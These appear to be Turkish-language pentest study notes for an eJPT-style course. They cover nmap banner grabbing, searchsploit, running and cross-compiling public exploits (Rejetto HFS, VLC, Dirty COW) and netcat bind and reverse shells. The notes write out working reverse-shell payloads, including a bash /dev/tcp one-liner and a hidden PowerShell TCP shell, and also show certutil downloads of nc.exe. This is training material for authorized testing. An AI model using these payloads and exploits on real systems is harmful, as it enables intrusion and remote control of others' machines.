## 1. Introduction To System_Host Based Attacks
![[Pasted image 20240131123233.png]]  

● Sistem/Ana bilgisayar tabanlı saldırılar genellikle hedef ağa erişim sağlandıktan sonra devreye girer, bu noktada iç ağdaki sunucuları, çalışma istasyonlarını veya dizüstü bilgisayarları zafiyetlerinden faydalanarak ele geçirmeniz gerekebilir.

Host tabanlı saldırılar genellikle hedef bilgisayarın içerisinde gerçekleşir ve genellikle ağ seviyesinde değil, doğrudan bilgisayar sistemine odaklanır. Bu tür saldırıları önlemek için, güvenlik yazılımları, güncellemeler ve güçlü şifre politikaları gibi güvenlik önlemleri almak önemlidir.

---
## SENARYO
##### Pentester olarak bir client ile anlaştık. Rules Engagement gereği size bir IP adresi verildi ve bu IP adresiyle uzaktan erişim sağlayabiliyorsunuz ve içinde bu sistemin SSH FTP Mysql web server gibi exploit edilecek service'ler olduğunu gördük ve bunları exploit ederek ilk erişimi sağladık. İlk erişimden sonra şunu farkettikki içerde bu bizim compromise olduğumuz sisteme bağlı internet erişimi olmayan uzaktan erişimi direk intternet yoluyla olabilecek bir özellikleri yok----INTERNAL NETWORK. Sadece ve sadece bizim Erişim sağladığımız sistemin uzaktan erişimi var ve onlar da bu sisteme bağlı. 
## Host Based Attack işte burada devreye giriyor.
![[Pasted image 20240131124407.png]]
#misconfig          #OS-vuln     
#inherit-vulnerabilities

### Ağ İçi Saldırılar


###### Peki biz bu girdiğimiz network içinde neler görebiliriz. Bir sürü host göreceğiz.
Workstations
Employee Çalışan Laptopları
Linux servers

FTP
Mysql Service
Web Servers

Windows/Linux bu ikisinin vuln'larının mantığını anlayacağız.





----
## Host & Network Penetration Testing - Exploitation
+ Exploitation consists of techniques and tools used by
adversaries/penetration testers to gain an <span style="background:#d4b106">initial foothold</span> on a target system or network.
###  Successful exploitation will heavily depend on the nature and <span style="background:#d4b106">quality of information gathering and service enumeration performed on the target.</span>

### + <span style="background:#ff4d4f">We can only exploit a target if we know what is vulnerable</span> - Unknown


### Basic Principle
## 1. Identify Services
## 2. Identify Vulns
## 3. Find Exploit Codes
### find exploit code 
### compile it
### modify it
### launch it 


---
### Penetration Testing Execution Standard
## #PTES
The Penetration Testing Execution Standard (PTES) is a penetration testing methodology that was developed by a team of information security practitioners with the aim of addressing the need for a comprehensive and up-to-date standard for penetration testing.
![[Pasted image 20240319135059.png]]

## Banner Grabing
Banner grabbing is an information gathering technique used by penetration testers to enumerate information regarding the target operating system as well as the services that are running on its open ports.
### + The primary objective of banner grabbing is to identify the service running on a specific port as well as the service version.
+ Banner grabbing can be performed through various techniques:
##### + Performing a service version detection scan with #nmap.
### + Connecting to the open port with #netcat
##### + Authenticating with the service (If the service supports authentication), for example; SSH, FTP, Telnet etc.

---

## nmap 10.0.2.8 -sV -O 

### nc 10.0.2.8
![[Pasted image 20240319200421.png]]
## ssh root@10.0.2.8

### nmap --script ssh2-enum-algos 10.0.2.8

### nmap --script ssh-hostkey --script-args ssh_hostkey=full 10.0.2.8

## nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=vagrant" 10.0.2.8

### nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=admin" 10.0.2.8

## nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=vagrant,ssh-run.password=vagrant" 10.0.2.8



---

## NMAP script arama - -Kali İçinde

### ls -la /usr/share/nmap/scripts | grep banner
![[Pasted image 20240319195805.png]]
##### Burada istediğin şeyle alakalı script aratıp bulabilirsin. Veya nmap sitesinden aratacaksın.


---
### nmap 10.0.2.8 -sV --script=banner

## Bu script service özellikle banne grabin vermediğinde çalıştırılabilir.

![[Pasted image 20240319200134.png]]

## whatis Command
![[Pasted image 20240319200253.png]]
### man nc


----

## searchsploit openssh

---

## Vulnerability Scanning With Nmap Scripts
#nmap-script-all 

### nmap --script http-shellshock --script-args “http-shellshock.uri=/gettime.cgi” 10.0.2.8



# nmap.org
## https://nmap.org/
### script'leri bulmak için



https://nmap.org/book/nse.html

---

### Nmap script'leri doğru kullanmak önemli sürekli güncellemelerle script eklendiği için her pentest de kontrol edilmeli ve denenmeli.

## ls /usr/share/nmap/scripts

![[Pasted image 20240320091114.png]]
### nmap 10.0.2.8 --top-ports 100 -sV -O

![[Pasted image 20240320091340.png]]
### Örneğin butaramaya bakalım port 80 de http server çalışıyor. Nmap 'in http ile ilgili çok fazla kullanılacak scripti vardır.

##### ls /usr/share/nmap/scripts | grep http
![[Pasted image 20240320091532.png]]
### Örnek WAF detect diye script var yani web app firewall tespit etmeye yarıyor


nmap 10.0.2.8 -p 80 -sV --script=http-waf-fingerprint
nmap 10.0.2.8 -p 80 -sV --script=http-enum

## nmap 10.0.2.8 -p 80 -sV --script=http-enum 
##### Örneğin http server'a enum yapacaksan bu script seçilebilir.
![[Pasted image 20240320092314.png]]

---

## Nmap Script Vuln
##### ls -la /usr/share/nmap/scripts | grep http vuln
![[Pasted image 20240320092933.png]]
### Biz bunu sadece vuln diye de aratabiliriz.


---
## #shellshock 
![[Pasted image 20240320093404.png]]

![[Pasted image 20240320093658.png]]
![[Pasted image 20240320093640.png]]

#### Nmap http-shellshock script sonuç vermesi için ilave arguments gerektirir
#http-shellshock
![[Pasted image 20240320093919.png]]
### cgi script'ler kullanıldığında nmap bu zaafiyete enum yapabilir bu yüzden argumets atacağız.


## Örneğin sitede böyle bir geri sayım gördün
![[Pasted image 20240320094207.png]]
##### Bu demektir ki dynamic bir code execution on şuan da
![[Pasted image 20240320094309.png]]
### Burada şunu görelim   <span style="background:#d4b106">"/gettime.cgi"</span> isimli bir cgi kod çalıştırılıyor
![[Pasted image 20240320094542.png]]
![[Pasted image 20240320094554.png]]
#### #cgi #shellshock #shellshock-cgi

![[Pasted image 20240320094807.png]]

![[Pasted image 20240320094951.png]]

### Şimdi burayı inceleyelim. Biz bir web server'a attack düzenliyoruz ve cgi kullanıldığını gördük. Burada shellshock olup olmayacağını araştırmamız lazım.
## Bu da nmap script-args ve http-shellshock ile olur.

### nmap 10.0.2.8 -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"

![[Pasted image 20240320095252.png]]
### Burada nmap bize hedef,n vuln olduğunu söylüyor ve daha da önemlisi CVE-2014-6271 koduyla bşze hangi zaafiyet olduğunu uluslararası database'den söylüyor.


---
## Vuln - Scan - MSF
![[Pasted image 20240320104747.png]]


---

## Searching For Public Exploits
#### After identifying a potential vulnerability within a target or a service running on a target, <font color="#ffc000">the next logical step will involve searching for exploit code</font> that can be used to exploit the vulnerability.

#### + Exploit code can easily be found online, however, it is important to note that downloading and <span style="background:#d4b106">running exploit code against a target can be quite dangerous.</span>

##### It is therefore recommended to analyze the exploit code closely to ensure that it works as intended.
+ There are a handful of legitimate and vetted (muayane edilmiş) exploit databases that you should use when searching for exploits online:
## ONLINE Search
### <span style="background:#d4b106">+ Exploit-db</span>
### <span style="background:#d4b106">+ Rapid7</span> 
### <span style="background:#d4b106">+ NIST</span>
### <span style="background:#d4b106">+ MITRE CVE List</span>
### + github

---

### Offline Search
##### searchsploit
##### msfconsole --> search      
---

>[!warning] Github veya başka siteleri herkes kullanabiliyor. Son 20 yıldır exploit developer'lar kendi üretmiş oldukları exploit'leri açık bir şekilde internete koyuyorlar fakat bunlar yukarıda belirtilen exploitler gibi verified değil. Yani bu exploit'i yazan kişiler aslında kendilerine çıkar sağlamak , siz pentest yapmaya çalışırken size compromise olabilirler veya sizin dosyalarınızı enfekte edebilirler, silebilirler. Bu yüzden aldığınız her kodu analiz etmek zorundasınız veya legitimate yerden almalısınız.




---
# EXPLOIT_DB
## exploit-db.com #exploit-db 
![[Pasted image 20240320114516.png]]
### Burada verified olan şudur ki sadece kanıtlanmış olanları bize listeler.

![[Pasted image 20240320114754.png]]

![[Pasted image 20240320114811.png]]

## Filters
##### Biz eğer remote bir exploit arıyorsak remote'yi seçeriz yalnız sisteme erişmişsek veya zaten aynı ağda isek LOCAL olarak vuln ararız. Örnek : Bir Priv Esc tekniği arıyorsak local'ı seçmeliyiz.
![[Pasted image 20240320115036.png]]

## Özellikle Port'a veya Platforma Göre Arama Yapabilirsin.
![[Pasted image 20240320115532.png]]
### Linux Platformundan 22 port numarasıyla bulunan exploit'ler. V    harfi verified olup olmadığını gösterir.


---
## TAGs ---->>> ne tür Bir zaafiyet olduğu
![[Pasted image 20240320115745.png]]
### Bu ilk baştaki tipten farklıdır. Çünkü örneğin bu attack local olarak execute edilebilen DOS 'mu yoksa XSS mi yoksa MSFCONSOLE ile mi yapılıyor bunu bulmamıza yarıyor.
## Eternalblue 'yi bulalım ms17-010
![[Pasted image 20240320120147.png]]

## Search ----> SErvice ismini vererek bulabilirsin
![[Pasted image 20240320120416.png]]


---

## ŞİMDİ EN ÖNEMLİ ÖZELLİĞİNE GELİYORUZ. APPLICATION BOLUMU

### Şimdi biz pentester olarak lab kurup varolan service'lerdeki vuln'ları test etmeliyiz. Bunu nerden en doğru şekilde bulacağız. mesela örnek metasploitable 3 de vsftpd 2.3.4 yok ama nu nasıl exploit ediliyor test etmem lazım.
![[Pasted image 20240320121431.png]]
![[Pasted image 20240320121444.png]]
##### Burada ki "A"    bize bu serviceyi indirme ve kurup kullanma test etme imkanı sağlıyor.
![[Pasted image 20240320121706.png]]
### Arama esnasında Has App seçersen sana direk test imkanı sağlayan zaafiyetli versiyonunun indirme app'ini verecektir.
---
## Google Dorking
![[Pasted image 20240320122145.png]]

### OffSec #exploit-db yi Kuran ve yöneten şirkettir.
## #rapid7 ise Metasploit FrameWork  

---


## Rapid 7  #rapid7
https://www.rapid7.com/db/
![[Pasted image 20240320123447.png]]


### Arama yapmaya başlamadan önce type seçerken module veya direl vuln olarak gözükür. Bu zaten msfconsole şirketi olduğu için module dediği msfconsole modulu
![[Pasted image 20240320123733.png]]
![[Pasted image 20240320123756.png]]


#### Aramayı yaparken genel service ismiyle aramak daha iyi .
### vsftpd 2.3.4 şeklinde aratınca çıkmıyor çünkü database'ye vsftpd v2.3.4 şeklinde kaydedilmiş. direk vsftpd olarak arat
![[Pasted image 20240320124109.png]]

### Nasıl yapıldığını da anlatıyor
![[Pasted image 20240320124248.png]]
## #eternalblue
![[Pasted image 20240320124356.png]]
![[Pasted image 20240320124524.png]]

### Exploit Code'nin üzerine tıkladığında nasıl exploit edildiği ve hangi sistemler üzerinde test edildiği yazar
![[Pasted image 20240320124701.png]]

---

### Google Dorking #googledorking 

## Exploit aramak için google da kullanılabilir.
##### eternalblue site:exploit-db.com
![[Pasted image 20240320125000.png]]

---
## PACKET STORM
https://packetstormsecurity.com/
![[Pasted image 20240320125316.png]]
![[Pasted image 20240320125328.png]]
### Son haberleri almak için çok iyi bir site bunu takip etmelisin

## TOOLs
### Siteyle alakalı en iyi şey TOOLs bolumu. Kullanacağın tool'lar hakında bilgi veriyor.
![[Pasted image 20240320125549.png]]
## White Papers da Exploits'leri açıkloyor nasıl olduğunu
![[Pasted image 20240320125643.png]]



---
## SearchSploit #searchsploit 
+ In certain cases, you may not have access to online exploits and as a result, you must be able to use the exploit sources <span style="background:#d4b106">available locally/offline.</span>

+ The entire Exploit-db database of exploits comes pre-packaged with Kali Linux, consequently providing you with all exploits locally.

![[Pasted image 20240321005723.png]]
### Herhangi bir linux distrosunda eğer exploit-db searchsploit yüklü değilse
## sudo apt-get update && sudo apt-get install exploitdb -y


---
## ls -la /usr/share/exploitdb 
![[Pasted image 20240321010125.png]]
![[Pasted image 20240321010318.png]]
### İsim olarak değil exploit numarasıyla kayıtlı
![[Pasted image 20240321010431.png]]

## searchsploit
![[Pasted image 20240321010555.png]]
### Burası önemli; herhangi bir exploiti aramadan önce -u ile update işlemi yapmalısın veya internet erişimi yoksa pentest başlamadan hemen önce yapmış olmalısın.
## searchsploit -u 
![[Pasted image 20240321010739.png]]
## exploit-db hergün update alır.

#### Önemli not : Eğer searchsploit -u komutunu uzun süredir çalıştırmıyorsan çok büyük ihtimal 3 gb yakın bir update alacaksın.
![[Pasted image 20240321011059.png]]

---
![[Pasted image 20240321011205.png]]


## searchsploit -m 49757
![[Pasted image 20240321011433.png]]
Bu komut, "searchsploit" aracının belirli bir zafiyetin (burada ID numarası 49757 ile belirtilen bir zafiyetin) detaylarını görüntülemek için kullanılır.

## searchsploit -m 49757 
Bu komutu hangi PWD 'de çalıştırırsan bu exploiti o klasöre kopyalar
![[Pasted image 20240321011722.png]]
### Sonra nano veya vim ile düzenlemesi yapılır.



---

## case based searchsploit
### searchsploit -c OPENSSH

![[Pasted image 20240321012245.png]]

### searchsploit ile bulduğumuz 49757.py dosyası searchsploit -m 49757 yazınca eJPT klasörğne hem koyalandı hem de bize infosu verildi.
## python 49757.py 10.0.2.7

![[Pasted image 20240321013318.png]]

##### Bu komut çalıştırıldı ve sonunda bize direk shell verdi msfconsole olmadan manuel olarak.

## <font color="#ff0000">searchsploit -c OpenSSH</font> komutu ile <font color="#00b050">searchsploit OpenSHH</font> komutu arasında ne fark vardır.
- **searchsploit -c OpenSSH:** Bu komut, sadece OpenSSH ile ilgili zafiyetleri arar.
- **searchsploit OpenSSH:** Bu komut ise hem OpenSSH hem de diğer yazılımlarda OpenSSH ile ilgili zafiyetleri arar.
---

## title search --> title'ında vsftpd geçenleri gösterir.
### searcsploit -t vsftpd
![[Pasted image 20240321013950.png]]

### Bu title sadece vuln olabilecek service ismiyle sınırlandırılmış değil.
## Buffer overflow    da aratabilirsin ddos da

![[Pasted image 20240321014215.png]]

---
## searchspoit -e "Windows XP"
#### Kelimesi kelimesine aratmak için exact search.
![[Pasted image 20240321014502.png]]
### Bu sonuçlaı grep'leye bilirsin


---

## Filters

### searchsploit remote windows smb

![[Pasted image 20240321014929.png]]

![[Pasted image 20240321015136.png]]

### ![[Pasted image 20240321015428.png]]

---

## Fixing Exploits
#fix-exploit #fix 

### Tüm Güvenlik Testleri Eksik Kalmaya Mahkumdur.
![[Pasted image 20240321120717.png]]

## Test Senaryosu Rejetto 'yu test etmek için exploit-db den Has App olanlarda arattık en altta kolay yuklenen HFS.exe olanı aldık yukledik hedefe.
### Hedef sisteme nmap taraması yaptık. Port 80 açık. Burada Rejetto Server çalıştırdığını bulduk. 

![[Pasted image 20240321120906.png]]
## nmap
![[Pasted image 20240321120946.png]]
### Buradan sonra bunu searchsploitte arattık
![[Pasted image 20240321121255.png]]
### Burada 39161.py olanı seçtik.
#Rejetto 

## Bulunduğumuz klasöre bunu kaydetmek için
### searchsploit -m 39161    bunu yaptık bizim eJPT klasörümüze geldi.


## Şimdi bu exploit nasıl kullanılıyor nasıl çalışıyor bunu detaylıca okuyorum.
![[Pasted image 20240321121448.png]]
### Diyor ki kendileri -->>>
### 1. Local IP ve Port değiştir
### 2. nc.exe 'yi karşı tarafa göndermek için Python Server aç
## Bunu yapmak için de KALI'den sağolsun 
##### cp /usr/share/windows-resources/binaries/nc.exe .
#### Burada duruyor karşı tarafa atacak nc
###<span style="background:#d4b106"> Burada python -m http.server 80</span>

### 3. python2 39161.py 10.0.2.5 80

![[Pasted image 20240321122448.png]]
## Ve şunu söylüyor 1-2 defa arka arkaya çalıştırmak gerekiyor diyor.

### Python Code şöyle çalışıyor. eJPT klasöründe çalışan python http server ile karşıya nc.exe 'yi atıyor. orada nc.exe çalışınca zaten geçmiş olsun. 1. denemede nc.exe atılıyor. 2 nci deneme de shell direk elinde.

![[Pasted image 20240321124245.png]]
### 3 Terminal açtık yan yana. --->> 3 'ünde de  neler olup bittiğini görmek için.

---

## Cross-Compiling Exploits

#c-kod-derleme
#code-compile
#c-code 
##### Bulduğun exploit code farklı farklı dillerde yazılmış olabilir. Sen bunu nerede çalıştıracaksan o sisteme göre compile etmek zprundasın. 
### In certain cases, exploit code will be developed in C/C++/C#, as a result, you will need to compile the exploit code in to a <span style="background:#d4b106">PE (Portable Executable) or binary.</span>
#### linux --> Binary
#### windows-->> PE portable exe
## Cross-Compiling is the process of compiling code for a platform other than the one performing the compilation. (derlemeyi gerçekleştiren platform dışında bir platform için kod derleme işlemidir.)
#### As a penetration tester, you will need to have the skills necessary to compile exploit code developed in C.

---
### Bir önceki örnekteki durumda varolan zaafiyetin exploit kodu Python da yazıldığı için kullanılacak platform için compile etmeye gerek yoktu. 

## Ama kod eğer C/ C# /C++   bunlarda yazıldıysa bunu çalıştırmak için exe veya binary yapmalısın.

---
https://www.exploit-db.com/exploits/9303
![[Pasted image 20240324234914.png]]
## Bu Cross-Compile Olayını göstermek için VLC player'ın C ile yazılmış bir zaafiyetinin üzerine çalışacağız. 

---
### Siteden zaafiyet exploit codu da bulduk sömürülecek exe'yi de bulup windowsa yukledik
![[Pasted image 20240324235355.png]]
![[Pasted image 20240324235452.png]]


---

### Ayrıca Bir KERNEL zaafiyeti kullanıp Priv Esc. exploit kodunu compile Yapmayı deneyeceğiz 

---

## Kullanılacak TOOL'lar
![[Pasted image 20240325000043.png]]
#mingw-w64
### Windows Compile tool 
##   
Mingw-w64 Nedir?

Mingw-w64, Windows için ücretsiz ve açık kaynaklı bir **yazılım geliştirme ortamı** (IDE)'dır. **Minimalist GNU for Windows** kelimelerinin kısaltmasıdır.

**Nasıl Bir Araçtır?**

Mingw-w64, Windows işletim sisteminde **C ve C++ programlama dillerinde** uygulama geliştirmeyi sağlar. Bunu yaparken, GNU Compiler Collection (GCC) ve GNU Binutils gibi **GNU araçlarının Windows portlarını** kullanır.
![[Pasted image 20240325000210.png]]
### apt-get install mingw-w64
---

## gcc
Kali Linux üzerinde **gcc**, GNU Compiler Collection (GCC) paketinin kısaltmasıdır. Bu paket, C ve C++ programlama dillerinde yazılmış kodları derlemek için kullanılan bir **yazılım geliştirme aracıdır (compiler)**.

### apt-get install gcc
![[Pasted image 20240325000431.png]]

### Tecrübeye dayalı olarak bir exploit kodu compilr ederken 32 bitlik mimariye göre compile edin çünkü bu hem 64 de hem 32 de çalışır .

## Bunu zaten exploit DB den de aratabiliriz ya da 
### searchsploit VideoLAN VLC SMB
![[Pasted image 20240325000935.png]]


### Ne yapıyorduk o an çalıştığımız directory'e bunu kopyalamak için
## searchsploit -m 9303

![[Pasted image 20240325001140.png]]

### Eğer exploiti C ile yazan kişi bunu well-documented şekilde yazdıysa nasıl compile edileceğini de içine eklemiş olur.
#### Yalnız bizim bulduğumuz exploitte şu an bu yok.
![[Pasted image 20240325001759.png]]

### Başlayalım VLC exploit Compile
![[Pasted image 20240325001940.png]]
## i686-w64-mingw32-gcc 9303.c -o exploit
![[Pasted image 20240325002333.png]]
![[Pasted image 20240325003008.png]]

![[Pasted image 20240325003026.png]]
### Bu x64 mimari içindi. sadece gcc farklı compile ediyor mingw farklı kompile ediyor.

## 32 bitlik için
![[Pasted image 20240325003647.png]]
### i686-w64-mingw32-gcc 9303.c -o exploit32bit -lws2_32

![[Pasted image 20240325003858.png]]


---

## Dirty COW # Linux Kernel 2.6.22
 #Linux-Kernel 2.6.22
### gcc -pthread 40839.c -o dirty -lcrypt
![[Pasted image 20240325004916.png]]
![[Pasted image 20240325004930.png]]

![[Pasted image 20240325005140.png]]

##### gcc -pthread 40839.c -o dirty -lcrypt
![[Pasted image 20240325005323.png]]

![[Pasted image 20240325005507.png]]

---
![[Pasted image 20240325010043.png]]
### https://github.com/offensive-security/exploitdb-bin-sploits

### Offensive Security'nin de precompiled binaries var burada

## Çünkü bazen compile işlemi başarısız oluyor buraya hazır olarak compile edilmiş hallerini koymuşlar.

---
---

## NETCAT
#nc #netcat 
## Netcat Nedir?

Netcat, TCP veya UDP protokollerini kullanarak ağ bağlantıları üzerinden veri okuma ve yazma işlemlerini gerçekleştiren bir ağ aracıdır. Hem komut satırı aracılığıyla hem de programlama dillerinde kullanılabilir.
<span style="background:#d4b106">- **Ağ bağlantı testi:**</span> Netcat, belirli bir IP adresinin ve portunun açık olup olmadığını test etmek için kullanılabilir.
<span style="background:#d4b106">- **Dosya aktarma:**</span> Netcat, iki bilgisayar arasında dosya aktarmak için kullanılabilir.
<span style="background:#d4b106">- **Port tarama:**</span> Netcat, bir bilgisayardaki açık portları taramak için kullanılabilir.
<span style="background:#d4b106">- **Sunucu ve istemci uygulamaları:**</span> Netcat, basit sunucu ve istemci uygulamaları oluşturmak için kullanılabilir.
<span style="background:#d4b106">- **Hata ayıklama:**</span> Netcat, ağ tabanlı uygulamaların hata ayıklamasında kullanılabilir.
<span style="background:#d4b106">- **Güvenlik testleri:**</span> Netcat, ağ güvenliği testlerinde kullanılabilir.

---
## Netcat 
+ Netcat (Aka TCP/IP Swiss Army Knife) is a networking utility used to read and write data to network connections using TCP or UDP.
+ Netcat is available for both <span style="background:#ff4d4f">*NIX and Windows </span> (NIX ---> UNIX LINUX etc.)operating systems, consequently making it extremely useful for cross-platform engagements.
+ Netcat utilizes a client-server communication architecture with two modes:
### Client mode - Netcat can be used in client mode to connect to any TCP/UDP port as well as a Netcat listener (server).
## Server mode - Netcat can be used to listen for connections from clients on a specific port.
+ Netcat can be used by penetration testers to perform the following functionality:
##  #netcat-Banner-Grabbing
## + Port Scanning
## #netcat-Transferring-Files
##  #netcat-Bind/Reverse-Shells

##### Önemli kazançlarından biri linuxdan windowsa veya tam tersine reverse shell alabilirsin.
---
## netcat
### nc --help
![[Pasted image 20240325112125.png]]
## man nc
![[Pasted image 20240325112208.png]]

## nc --->> UDP
![[Pasted image 20240325112718.png]]
##### -u seçeneğini UDP bir portla ilgili bir işlem yapmak için kullanıyoruz.

## nc   Code execution  [ nc -e ]
![[Pasted image 20240325112950.png]]
## banner grabbing
### nc -nv 10.0.2.5 22
![[Pasted image 20240325113630.png]] 
![[Pasted image 20240325113847.png]]

## nc -nvu 10.0.2.5 445 --->> udp port'a baktık.


---
![[Pasted image 20240325114254.png]]
### Şimdi bizim de hedef sisteminde internete erişim yoksa karşı tarafa ben nasıl nc kuracağım.
#### /usr/share/windows-binaries

##### Burada alıp python3 -m httpserver ile karşıya göndereceğiz.
### 1. python -m httpserver
### 2. cert utıl
![[Pasted image 20240325114819.png]]
### certutil -urlcache -f http://10.0.2.4/nc.exe


---
### 1. Kali'de --> nc -nvlp 1234
## 2. Win --> nc.exe -nv 10.0.2.4 1234

## Bunu yapınca kali dinler Win bağlantıyı kurar başlatır.

### 1. Kali'de --> nc -nv 10.0.2.4 1234
## 2. Win --> nc.exe -nvlp 1234

###  Bunu yapınca win dinler kali konuşmayı başlatır.

---

### nc udp
![[Pasted image 20240325121213.png]]
![[Pasted image 20240325121306.png]]

---

## File Transfer Nc
#nc-ile-dosya-gonderme 
![[Pasted image 20240325123728.png]]
### Karşı taraf dinleyecek ve gelen ne olursa bunu  >> test.txt 'ye kaydedecek.


![[Pasted image 20240325124305.png]]

## nc -nc 10.0.2.5 1234 < ncCat.txt
![[Pasted image 20240325124433.png]]
![[Pasted image 20240325124414.png]]

---

### Bind Shells
#bind-shell 
#netcat-Bind/Reverse-Shells 
![[Pasted image 20240325133054.png]]


## -e option --->> execute command

### Linux -->>   /bin/bash      /bin/sh
### Windows -->> Powershell.exe        cmd.exe

---

## Şimdi burada şöyle bir söylem aklımıza geliyor. 
### REVERSE SHELL'ler --->> BIND SHELL'ler den DAHA IYIDIR.

## Bu neden böyle söylenir ?
##### 1. İLK OLARAK BİZ BIND SHELL ALACAKSAK HEDEF SISTEMDE BIR NC LISTENER CONFIGURE ETMEMIZ GEREKECEK. BIZIM HEDEF SISTEME DAHA ERISIMIMIZ YOKSA BEN BUNU NASIL YAPACAGIM.
#### 2. CYBER SECURITY -->> Network Security mantığıyla bakınca bu durum inbound traffic tipik olarak firewall'lar veya başka bir deffensive tedbir tarafından block'lanır.
### Windows firewall enabled durumda ise bir bindshell çok büyük ihtimal engellenecektir. 
![[Pasted image 20240325134104.png]]
### Reverse shell'de durum bind shell'dekinin tam tersidir. Hedeften bize bağlantı açılır.

## Outgoing Traffic firewall'lar veya güvenlik mekanizmaları tarafından Çok Nadiren Block'lanır


---
### Evet senartomuz gereği biz hedeften bir bind shell alacaksak karşı taraf nc çalıştırmalı bizim belirlediğimiz portumuza bağlantıyı dinlemeli
#### Bu da yetmeden bize cmd.exe veya powershell.exe vermeli. Bunu şimdi kendimiz configure edeceğiz ilerde başka programın içine gömüp veta bir zaafiyete tetiklettirip yaptıracağız.

## nc.exe -nvlp 1234 -e cmd.exe
![[Pasted image 20240325135058.png]]
![[Pasted image 20240325135142.png]]
### Kaliye Geçtik
## nc -nv 10.0.2.5 1234
![[Pasted image 20240325135245.png]]

## Bu neden anlatılıyor ? Ben zaten sisteme bunları yaptıracak kadar erişim sağladıysam ne gereke var. Bu düzeyde erişimin yok ancak başka programı bunu yapmaya tetiklettirebilirsin.

![[Pasted image 20240325135417.png]]


### Aynısının tam tersi
![[Pasted image 20240325135747.png]]

![[Pasted image 20240325135827.png]]


![[Pasted image 20240325135729.png]]


### Burada nc -nvlp -c /bin/bash
#### -c option da kullanılabilir. --->> sADECE LINUX DA KULLANILIYOR
![[Pasted image 20240325140036.png]]

## MANTIK ŞU BEN BIR DINLEYICI AÇIYORUM. BURAYA BANA GELENE SHELL VERECEM.
![[Pasted image 20240325140126.png]]
![[Pasted image 20240325140117.png]]

---
## REVERSE SHELL
![[Pasted image 20240325221316.png]]

### Az önce yapılan işlemin tam tersi yapılacak.

## netcat çalıştırılacak iki taraftada. Bu sefer dinleyen biziz attacker karşı taraf bize 
### nc -nv 10.0.2.4 1234 -e cmd.exe
##### Bu komutla netcat çalışsın, 10.0.2.4 IP 'si 1234 portuna gidilsin ve burada eğer bizi dinleyen bekleyen birisi varsa ona shell verilsin

## attacker : nc -nvlp 1234
### Veee shell gelir.

![[Pasted image 20240325221545.png]]
![[Pasted image 20240325221529.png]]
### Bu tarz saldırı yapmanın bir sakıncası var. Reverse shell aldığında hedef makineye mecburen IP adresini girmek zorundasın ki hedeften bizim dinleme yaptığımız attacker makineye bağlantı isteği gönderebilsin. Bu şekilde de security analyst senin IP adresini görecektir ve saldırı açığa çıkabilir.

---
### Aynısının tam tersi windows attacker linux target

![[Pasted image 20240325223004.png]]

![[Pasted image 20240325222945.png]]
![[Pasted image 20240325222927.png]]

---

## Reverseshell cheatsheet
#cheatsheet
#reverseshell 

### Netcat'e ihtiyaç duymadan biz reverese shell alabiliriz.
## 1. python
## 2. powershell
## 3. C / C++
## 4. bash

### Bunlarla yazılmış kodlar bizim kurmuş olduğumuz dinleyiciye bağlanabilirler nc 'ye gerek kalmadan.

---
## REVERSE SHELL CHEATSHEET
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows
![[Pasted image 20240325224122.png]]
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux

![[Pasted image 20240325224141.png]]

https://github.com/swisskyrepo/PayloadsAllTheThings

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
![[Pasted image 20240325224334.png]]
## bU MD DOSYASI OLDUĞU İÇİN HEMEN OBSIDIAN ICINE CEKTIK

---
### Mantık nasıl çalışacak aşağıda yazılı olan reverse shell teknolojisine göre seçilip ya hedef sistemin cmd'sinde veya powershell'inde çalıştırılması sağlanacak yada zaafiyetli bir uygulama içine gömülerek tetiklenmesi sağlanabilir veya social engineering yapılabilir.


---
![[Pasted image 20240325224931.png]]
### bash -i >& /dev/tcp/10.0.0.1/4242 0>&1


![[Pasted image 20240325233938.png]]
### bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

![[Pasted image 20240325233918.png]]

----

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Örneğin bu koda powershell de çalıştırılabilirse reverseshell alınabilir.

![[Pasted image 20240325234330.png]]

---
### revshells.com
### https://www.revshells.com/

![[Pasted image 20240325235204.png]]

### Port ve IP ayarladıktan sonra Listener'ı ayarlıyorsunuz.

![[Pasted image 20240325235322.png]]

## Payload'ı da buradan ayarladık
### reverse / bind / msfvenom / hoax
![[Pasted image 20240325235421.png]]
![[Pasted image 20240325235529.png]]
### OS de seçtik
### karşı tarafta nc.exe yok o zaman powershell'i tercih ediyoruz.


![[Pasted image 20240326000244.png]]
### Sitenin ürettiği powershell'i cmd'de çalıştırdık 
![[Pasted image 20240326000213.png]]

### Bundan önce zaten dinleyiciyi açmıştık.
![[Pasted image 20240326000353.png]]
![[Pasted image 20240326000420.png]]

---

## C Windows
![[Pasted image 20240326000641.png]]
### C windows içinde reverseshell üretilebilir yalnız önceki dersteki gibi compile etmelisin exe olması için.
![[Pasted image 20240326000951.png]]

---

### https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet


---
## Penetration Testing With MSF
![[Pasted image 20240326001942.png]]

![[Pasted image 20240326002723.png]]

### searchsploit ProcessMaker
![[Pasted image 20240326003018.png]]
## searchsploit ProcessMaker -w
### bunu yaptığında internetteki linkini de gösterir.


---
---
## PowerShell-Empire
https://tryhackme.com/r/room/rppsempire
### Bunu Çöz Try Hack Me Module

![[Pasted image 20240326003947.png]]
## #powershell-empire

### sudo apt-get update && sudo apt-get install powershell-empire starkiller -y

PowerShell-Empire (Aka Empire) is a pure PowerShell <span style="background:#d4b106">exploitation/postexploitation framework</span> built on cryptological-secure communications and flexible architecture.
